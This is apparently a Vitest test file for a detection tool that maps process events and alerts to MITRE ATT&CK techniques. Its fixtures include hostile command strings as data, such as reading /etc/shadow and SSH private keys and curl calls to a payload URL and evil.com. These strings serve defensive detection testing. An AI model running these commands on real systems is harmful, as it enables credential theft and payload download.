import { describe, it, expect } from "vitest";
import { mapEventToMitre, mapAlertToMitre, coverageMatrix } from "./mitre.js";
import type { TimelineEvent, Alert } from "./types.js";

function makeEvent(
  summary: string,
  overrides: Partial<TimelineEvent> = {}
): TimelineEvent {
  return {
    timestamp: new Date("2025-06-15T12:00:00Z"),
    source: "tetragon",
    kind: "process_exec",
    verdict: "none",
    summary,
    ...overrides,
  };
}

function makeAlert(events: TimelineEvent[]): Alert {
  return {
    ruleName: "test-rule",
    severity: "high",
    title: "Test Alert",
    triggeredAt: new Date("2025-06-15T12:00:00Z"),
    evidence: events,
    description: "Test alert description",
  };
}

// ---------------------------------------------------------------------------
// mapEventToMitre
// ---------------------------------------------------------------------------

describe("mapEventToMitre", () => {
  it("maps /etc/shadow access to T1003.008", () => {
    const event = makeEvent("cat /etc/shadow");
    const result = mapEventToMitre(event);
    expect(result).toContainEqual(
      expect.objectContaining({ id: "T1003.008", tactic: "credential-access" })
    );
  });

  it("maps .ssh/ access to T1552.004", () => {
    const event = makeEvent("read ~/.ssh/id_rsa");
    const result = mapEventToMitre(event);
    expect(result).toContainEqual(
      expect.objectContaining({ id: "T1552.004", tactic: "credential-access" })
    );
  });

  it("maps curl to T1105", () => {
    const event = makeEvent("curl http://example.com/payload");
    const result = mapEventToMitre(event);
    expect(result).toContainEqual(
      expect.objectContaining({ id: "T1105", tactic: "command-and-control" })
    );
  });

  it("maps egress to T1041", () => {
    const event = makeEvent("egress detected to external host");
    const result = mapEventToMitre(event);
    expect(result).toContainEqual(
      expect.objectContaining({ id: "T1041", tactic: "exfiltration" })
    );
  });

  it("maps /bin/bash to T1059.004", () => {
    const event = makeEvent("spawned /bin/bash");
    const result = mapEventToMitre(event);
    expect(result).toContainEqual(
      expect.objectContaining({ id: "T1059.004", tactic: "execution" })
    );
  });

  it("maps ssh command to T1021.004", () => {
    const event = makeEvent("ssh user@host");
    const result = mapEventToMitre(event);
    expect(result).toContainEqual(
      expect.objectContaining({ id: "T1021.004", tactic: "lateral-movement" })
    );
  });

  it("returns empty array for unmatched event", () => {
    const event = makeEvent("opened /tmp/data.txt for reading");
    const result = mapEventToMitre(event);
    expect(result).toHaveLength(0);
  });

  it("returns multiple matches for event with several indicators", () => {
    const event = makeEvent("ssh user@host", { process: "cat ~/.ssh/id_rsa" });
    const result = mapEventToMitre(event);
    const ids = result.map(t => t.id);
    expect(ids).toContain("T1552.004");
    expect(ids).toContain("T1021.004");
  });
});

// ---------------------------------------------------------------------------
// mapAlertToMitre
// ---------------------------------------------------------------------------

describe("mapAlertToMitre", () => {
  it("deduplicates techniques across evidence events", () => {
    const alert = makeAlert([
      makeEvent("cat /etc/shadow"),
      makeEvent("cat /etc/passwd"),
    ]);
    const result = mapAlertToMitre(alert);
    const t1003 = result.filter(t => t.id === "T1003.008");
    expect(t1003).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// coverageMatrix
// ---------------------------------------------------------------------------

describe("coverageMatrix", () => {
  it("groups techniques by tactic", () => {
    const alerts = [
      makeAlert([
        makeEvent("cat /etc/shadow"),
        makeEvent("curl http://evil.com"),
      ]),
    ];
    const matrix = coverageMatrix(alerts);
    expect(matrix.get("credential-access")).toBeDefined();
    expect(matrix.get("command-and-control")).toBeDefined();
  });

  it("returns empty map for empty alerts", () => {
    const matrix = coverageMatrix([]);
    expect(matrix.size).toBe(0);
  });
});
